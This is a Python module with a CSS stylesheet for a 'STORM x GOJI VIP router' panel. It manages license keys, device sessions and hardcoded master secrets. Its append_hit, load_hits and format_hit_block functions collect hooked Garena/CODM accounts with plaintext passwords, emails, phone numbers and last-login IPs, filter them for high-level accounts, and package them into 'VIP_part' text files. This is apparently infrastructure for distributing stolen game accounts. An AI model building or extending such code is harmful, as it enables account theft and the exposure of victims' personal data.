#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""STORM x GOJI shared — keys, VIP hits, portable keys, sessions."""
from __future__ import annotations
import hashlib, json, os, threading
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

BASE = Path(__file__).resolve().parent
_DATA_ENV = (os.environ.get("DATA_DIR") or os.environ.get("RENDER_DISK_PATH") or "").strip()
DATA = Path(_DATA_ENV) if _DATA_ENV else (BASE / "router_data")
try:
    DATA.mkdir(parents=True, exist_ok=True)
except Exception:
    DATA = BASE / "router_data"
    DATA.mkdir(parents=True, exist_ok=True)

VIP_DIR = DATA / "vip_hits"
try:
    VIP_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    pass

KEYS_DB = DATA / "keys.json"
EVENTS = DATA / "events.jsonl"
ADMIN_CFG = DATA / "admin.json"
HITS_DB = DATA / "hits.jsonl"

MASTER_STORM = "STORM-POGI-LIFE"
MASTER_GOJI = "GOJI-POGI-LIFE"
KEY_PREFIX = "GOJI-STORM-"
_KEY_SIGN_SECRET = "STORM-GOJI-ROUTER-v4-OFX-2019"
ROUTER_API_SECRET = os.environ.get("ROUTER_API_SECRET", "STORM-GOJI-HOOK-SECRET-OFX")

_lock = threading.RLock()
_hit_lock = threading.RLock()


def now() -> datetime:
    return datetime.utcnow()


def iso(dt: Optional[datetime]) -> Optional[str]:
    if dt is None:
        return None
    try:
        return dt.isoformat(timespec="seconds") + "Z"
    except Exception:
        return None


def parse_iso(s: Optional[str]) -> Optional[datetime]:
    if not s:
        return None
    try:
        return datetime.fromisoformat(str(s).rstrip("Z"))
    except Exception:
        return None


def esc(s: Any) -> str:
    return (
        str(s if s is not None else "")
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def hash_pw(pw: str) -> str:
    return hashlib.sha256(("sg|" + str(pw)).encode("utf-8", errors="ignore")).hexdigest()


def ensure_admin() -> None:
    try:
        if not ADMIN_CFG.exists():
            ADMIN_CFG.write_text(
                json.dumps({"password_hash": hash_pw(MASTER_GOJI), "updated_at": iso(now())}, indent=2),
                encoding="utf-8",
            )
    except Exception:
        pass


def load_db() -> Dict[str, Any]:
    if not KEYS_DB.exists():
        return {"keys": {}, "banned_devices": [], "revoked": []}
    try:
        with _lock:
            data = json.loads(KEYS_DB.read_text(encoding="utf-8"))
        if not isinstance(data, dict):
            return {"keys": {}, "banned_devices": [], "revoked": []}
        data.setdefault("keys", {})
        data.setdefault("banned_devices", [])
        data.setdefault("revoked", [])
        if not isinstance(data["keys"], dict):
            data["keys"] = {}
        return data
    except Exception:
        return {"keys": {}, "banned_devices": [], "revoked": []}


def save_db(db: Dict[str, Any]) -> None:
    try:
        with _lock:
            DATA.mkdir(parents=True, exist_ok=True)
            tmp = KEYS_DB.with_suffix(".tmp")
            tmp.write_text(json.dumps(db, indent=2, ensure_ascii=False), encoding="utf-8")
            tmp.replace(KEYS_DB)
    except Exception:
        try:
            KEYS_DB.write_text(json.dumps(db, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass


def log_event(kind: str, detail: dict) -> None:
    row = {"ts": iso(now()), "kind": kind}
    if isinstance(detail, dict):
        row.update(detail)
    try:
        with _lock:
            with open(EVENTS, "a", encoding="utf-8") as f:
                f.write(json.dumps(row, ensure_ascii=False) + "\n")
    except Exception:
        pass


def read_events(limit: int = 100) -> List[dict]:
    if not EVENTS.exists():
        return []
    try:
        lines = EVENTS.read_text(encoding="utf-8", errors="ignore").splitlines()
        out: List[dict] = []
        for line in reversed(lines):
            line = line.strip()
            if not line:
                continue
            try:
                out.append(json.loads(line))
            except Exception:
                continue
            if len(out) >= limit:
                break
        return out
    except Exception:
        return []


def b32_encode(data: bytes) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    bits = value = 0
    out = []
    for b in data:
        value = (value << 8) | b
        bits += 8
        while bits >= 5:
            bits -= 5
            out.append(alphabet[(value >> bits) & 31])
    if bits:
        out.append(alphabet[(value << (5 - bits)) & 31])
    return "".join(out)


def sign_payload(payload: str) -> str:
    return hashlib.sha256((_KEY_SIGN_SECRET + "|" + payload).encode("utf-8")).hexdigest()[:8].upper()


def make_portable_key(expires_at: Optional[str]) -> str:
    unix = 0
    if expires_at:
        try:
            unix = int(datetime.fromisoformat(str(expires_at).rstrip("Z")).timestamp())
        except Exception:
            unix = 0
    exp_code = b32_encode(unix.to_bytes(4, "big")).ljust(7, "A")[:7]
    sig = sign_payload(f"P|{unix}|399")[:4]
    body = f"P{exp_code}{sig}"
    chunks = [body[i : i + 4] for i in range(0, len(body), 4)]
    return KEY_PREFIX + "-".join(chunks)


def parse_duration(unit: str, amount: int) -> Optional[str]:
    unit = (unit or "").strip().lower()
    if unit in ("lifetime", "life", "0", "none", ""):
        return None
    try:
        amount = int(amount)
    except Exception:
        amount = 1
    if amount <= 0:
        return None
    n = now()
    table = {
        "m": "minutes", "min": "minutes", "minute": "minutes", "minutes": "minutes",
        "h": "hours", "hr": "hours", "hour": "hours", "hours": "hours",
        "d": "days", "day": "days", "days": "days",
        "w": "weeks", "week": "weeks", "weeks": "weeks",
        "mo": "months", "month": "months", "months": "months",
        "y": "years", "year": "years", "years": "years",
    }
    kind = table.get(unit)
    if not kind:
        return None
    if kind == "minutes":
        d = timedelta(minutes=amount)
    elif kind == "hours":
        d = timedelta(hours=amount)
    elif kind == "days":
        d = timedelta(days=amount)
    elif kind == "weeks":
        d = timedelta(weeks=amount)
    elif kind == "months":
        d = timedelta(days=amount * 30)
    else:
        d = timedelta(days=amount * 365)
    return iso(n + d)


def append_hit(payload: dict) -> None:
    if not isinstance(payload, dict):
        return
    payload = dict(payload)
    payload.setdefault("hooked_at", iso(now()))
    try:
        with _hit_lock:
            DATA.mkdir(parents=True, exist_ok=True)
            with open(HITS_DB, "a", encoding="utf-8") as f:
                f.write(json.dumps(payload, ensure_ascii=False) + "\n")
    except Exception:
        pass
    try:
        log_event("vip_hook", {
            "account": str(payload.get("account") or "")[:32],
            "level": payload.get("codm_level"),
            "uid": payload.get("uid"),
            "hook_source": payload.get("hook_source"),
        })
    except Exception:
        pass


def load_hits(min_level: int = 400, max_level: int = 450) -> List[dict]:
    if not HITS_DB.exists():
        return []
    out: List[dict] = []
    seen = set()
    try:
        with _hit_lock:
            lines = HITS_DB.read_text(encoding="utf-8", errors="ignore").splitlines()
    except Exception:
        return []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except Exception:
            continue
        if not isinstance(row, dict):
            continue
        try:
            lvl = int(row.get("codm_level") or 0)
        except Exception:
            continue
        if lvl < min_level or lvl > max_level:
            continue
        key = (str(row.get("account") or ""), str(row.get("uid") or ""), lvl)
        if key in seen:
            continue
        seen.add(key)
        out.append(row)
    try:
        out.sort(key=lambda r: int(r.get("codm_level") or 0), reverse=True)
    except Exception:
        pass
    return out


def format_hit_block(h: dict) -> str:
    def g(*keys, default="N/A"):
        for k in keys:
            v = h.get(k)
            if v is not None and str(v).strip() != "":
                return v
        return default
    lines = [
        "-" * 60,
        f"Account: {g('account')} : {g('password')}",
        f"UID: {g('uid')}",
        f"Username: {g('username')}",
        f"Nickname: {g('nickname')}",
        f"Garena Shell: {g('shell_balance', default=0)}",
        f"Email: {g('email', 'email_display')}",
        f"Mobile: {g('mobile', 'formatted_mobile')}",
        f"Country: {g('country')}",
        "",
        "--- CODM Information ---",
        f"Account Level: {g('codm_level')}",
        f"Server: {g('codm_region')}",
        f"IGN: {g('codm_nickname')}",
        f"CODM UID: {g('codm_uid', 'uid')}",
        "",
        "--- Login History ---",
        f"Last Login: {g('last_login', 'last_login_date')}",
        f"Last Login IP: {g('last_login_ip')}",
        f"Last Login Country: {g('last_login_country')}",
        "",
        f"Clean: {h.get('is_clean', False)}",
        f"Hooked: {g('hooked_at')}",
        f"Source: {g('hook_source', default='unknown')}",
        "✦  STORM × GOJI  VIP ROUTER  ✦",
        "-" * 60,
    ]
    return "\n".join(str(x) for x in lines)


def build_vip_parts(hits: List[dict], per_file: int = 50) -> List[Tuple[str, str]]:
    if not hits:
        return []
    try:
        per_file = max(1, int(per_file))
    except Exception:
        per_file = 50
    parts: List[Tuple[str, str]] = []
    for i in range(0, len(hits), per_file):
        chunk = hits[i : i + per_file]
        body = "\n\n".join(format_hit_block(h) for h in chunk)
        n = (i // per_file) + 1
        parts.append((f"VIP_part-{n}.txt", body + "\n"))
    return parts


def touch_session(key: str, device_id: str) -> None:
    if not key:
        return
    db = load_db()
    rec = db.get("keys", {}).get(key)
    if not isinstance(rec, dict):
        return
    devices = rec.get("devices")
    if not isinstance(devices, list):
        devices = []
    now_s = iso(now())
    found = False
    for d in devices:
        if isinstance(d, dict) and d.get("id") == device_id:
            d["last_seen"] = now_s
            found = True
            break
    if not found and device_id:
        devices.append({"id": device_id, "last_seen": now_s})
    max_hist = int(rec.get("max_devices") or 3) + 5
    if len(devices) > max_hist:
        devices = devices[-max_hist:]
    rec["devices"] = devices
    rec["last_seen"] = now_s
    if device_id:
        rec["device_id"] = device_id
    db.setdefault("keys", {})[key] = rec
    save_db(db)


def session_status(rec: dict, idle_minutes: int = 15) -> str:
    if not isinstance(rec, dict):
        return "offline"
    if rec.get("banned"):
        return "banned"
    ls = parse_iso(rec.get("last_seen"))
    if not ls:
        return "offline"
    try:
        delta = (now() - ls).total_seconds()
    except Exception:
        return "offline"
    if delta <= idle_minutes * 60:
        return "active"
    if delta <= 24 * 3600:
        return "idle"
    return "offline"


CSS = """
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@600;700;800;900&family=JetBrains+Mono:wght@700;800&display=swap');
:root{
  --bg:#05040a;
  --bg2:#0c0a14;
  --card:rgba(18,14,32,.92);
  --card2:linear-gradient(145deg,rgba(28,20,48,.95),rgba(12,10,22,.98));
  --line:rgba(120,90,200,.28);
  --line2:rgba(0,229,255,.18);
  --cyan:#00f0ff;
  --cyan2:#6af7ff;
  --mg:#ff2d9b;
  --mg2:#ff6ec7;
  --text:#f7f5ff;
  --muted:#a39bb8;
  --ok:#3dff9a;
  --bad:#ff4d6d;
  --warn:#ffc14d;
  --glow:0 0 24px rgba(0,240,255,.25);
  --glow-mg:0 0 24px rgba(255,45,155,.28);
  --font:'Inter',ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif;
  --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
}
*{box-sizing:border-box}
html{ -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
body{
  margin:0;
  font-family:var(--font);
  font-weight:700;
  letter-spacing:.01em;
  background:
    radial-gradient(900px 500px at 8% -8%,rgba(255,45,155,.16) 0%,transparent 55%),
    radial-gradient(800px 480px at 100% 0%,rgba(0,240,255,.12) 0%,transparent 50%),
    radial-gradient(1200px 700px at 50% 120%,rgba(90,40,180,.12) 0%,transparent 45%),
    linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%);
  color:var(--text);
  min-height:100vh;
}
a{color:var(--cyan);text-decoration:none;font-weight:800}
a:hover{color:var(--cyan2);text-shadow:0 0 12px rgba(0,240,255,.45)}
.nav{
  display:flex;gap:.9rem;flex-wrap:wrap;align-items:center;
  padding:1.05rem 1.4rem;
  border-bottom:1px solid var(--line);
  background:rgba(8,6,16,.88);
  backdrop-filter:blur(14px);
  position:sticky;top:0;z-index:20;
  box-shadow:0 8px 32px rgba(0,0,0,.35);
}
.nav .brand{
  font-weight:900;
  font-size:1.05rem;
  letter-spacing:.14em;
  text-transform:uppercase;
  background:linear-gradient(90deg,var(--cyan),var(--mg2),var(--mg));
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 10px rgba(0,240,255,.25));
  margin-right:.4rem;
}
.nav a{
  color:var(--muted);
  font-size:.82rem;
  font-weight:800;
  letter-spacing:.06em;
  text-transform:uppercase;
  padding:.35rem .55rem;
  border-radius:8px;
  transition:.15s ease;
}
.nav a:hover,.nav a.active{
  color:var(--text);
  background:rgba(0,240,255,.08);
  box-shadow:inset 0 0 0 1px rgba(0,240,255,.2);
}
.wrap{max-width:1120px;margin:0 auto;padding:1.4rem 1.25rem 2rem}
h1{
  font-size:1.65rem;
  font-weight:900;
  letter-spacing:.04em;
  margin:0 0 1.05rem;
  text-transform:uppercase;
  background:linear-gradient(90deg,#fff,var(--cyan2));
  -webkit-background-clip:text;background-clip:text;color:transparent;
}
h2{
  font-size:.95rem;
  font-weight:800;
  letter-spacing:.08em;
  text-transform:uppercase;
  margin:0 0 .75rem;
  color:var(--muted);
}
.card{
  background:var(--card2);
  border:1px solid var(--line);
  border-radius:16px;
  padding:1.2rem 1.3rem;
  margin-bottom:1.1rem;
  box-shadow:0 12px 40px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.04);
}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.9rem}
.stat{
  background:linear-gradient(160deg,rgba(22,16,40,.95),rgba(10,8,18,.98));
  border:1px solid var(--line2);
  border-radius:14px;
  padding:1rem 1.05rem;
  box-shadow:var(--glow);
}
.stat b{
  display:block;
  font-size:1.7rem;
  font-weight:900;
  letter-spacing:.02em;
  color:var(--cyan);
  text-shadow:0 0 18px rgba(0,240,255,.35);
  line-height:1.15;
}
.stat span{
  color:var(--muted);
  font-size:.72rem;
  font-weight:800;
  letter-spacing:.07em;
  text-transform:uppercase;
}
.btn,.btn-mg,.btn-bad{
  display:inline-block;border:0;border-radius:11px;
  padding:.55rem 1rem;
  font-weight:900;
  font-family:var(--font);
  letter-spacing:.06em;
  text-transform:uppercase;
  font-size:.72rem;
  cursor:pointer;margin:.14rem;
  transition:transform .12s ease, box-shadow .12s ease;
}
.btn:hover,.btn-mg:hover,.btn-bad:hover{transform:translateY(-1px)}
.btn{
  background:linear-gradient(95deg,var(--cyan),#5cf);
  color:#031018;
  box-shadow:0 6px 20px rgba(0,240,255,.25);
}
.btn-mg{
  background:linear-gradient(95deg,var(--mg),var(--mg2));
  color:#1a0410;
  box-shadow:0 6px 20px rgba(255,45,155,.28);
}
.btn-bad{
  background:linear-gradient(95deg,#ff3d5c,#ff6b81);
  color:#1a0408;
  box-shadow:0 6px 18px rgba(255,77,109,.25);
}
input,select{
  width:100%;
  background:rgba(8,6,16,.9);
  border:1px solid var(--line);
  color:var(--text);
  border-radius:12px;
  padding:.65rem .8rem;
  margin:.3rem 0 .7rem;
  font-family:var(--font);
  font-weight:700;
  font-size:.9rem;
  outline:none;
  transition:border .15s, box-shadow .15s;
}
input:focus,select:focus{
  border-color:rgba(0,240,255,.55);
  box-shadow:0 0 0 3px rgba(0,240,255,.12);
}
label{
  font-size:.72rem;
  font-weight:800;
  letter-spacing:.08em;
  text-transform:uppercase;
  color:var(--muted);
}
table{width:100%;border-collapse:collapse;font-size:.82rem;font-weight:700}
th,td{padding:.55rem .4rem;border-bottom:1px solid var(--line);text-align:left;vertical-align:middle}
th{
  color:var(--muted);
  font-weight:900;
  font-size:.68rem;
  letter-spacing:.1em;
  text-transform:uppercase;
}
td{font-weight:700}
.mono{
  font-family:var(--mono);
  font-size:.78rem;
  font-weight:800;
  word-break:break-all;
  letter-spacing:.02em;
}
.tag{
  display:inline-block;
  padding:.18rem .5rem;
  border-radius:999px;
  font-size:.65rem;
  font-weight:900;
  letter-spacing:.07em;
  text-transform:uppercase;
  background:rgba(30,24,48,.9);
  color:var(--cyan);
  border:1px solid var(--line);
}
.tag.ok{color:var(--ok);border-color:rgba(61,255,154,.35);background:rgba(61,255,154,.08)}
.tag.bad{color:var(--bad);border-color:rgba(255,77,109,.35);background:rgba(255,77,109,.08)}
.tag.warn{color:var(--warn);border-color:rgba(255,193,77,.35);background:rgba(255,193,77,.08)}
.flash{padding:.75rem 1rem;border-radius:12px;margin-bottom:.95rem;font-weight:800}
.flash.ok{background:rgba(61,255,154,.1);border:1px solid rgba(61,255,154,.35)}
.flash.bad{background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.35)}
.hint{color:var(--muted);font-size:.76rem;font-weight:700}
.table-wrap{overflow:auto;border-radius:10px}
.actions{display:flex;flex-wrap:wrap;gap:.35rem;align-items:center}
footer{
  text-align:center;
  color:var(--muted);
  font-size:.68rem;
  font-weight:800;
  letter-spacing:.12em;
  text-transform:uppercase;
  padding:1.6rem 1rem 2rem;
}
.live-dot{
  width:9px;height:9px;border-radius:50%;
  background:var(--ok);
  display:inline-block;margin-right:8px;
  box-shadow:0 0 12px var(--ok);
  animation:pulse 1.4s infinite;
  vertical-align:middle;
}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.85)}}
/* premium extras */
.card h2{border-left:3px solid var(--mg);padding-left:.55rem}
.stat:hover{border-color:rgba(0,240,255,.4)}
::selection{background:rgba(0,240,255,.3);color:#fff}
"""
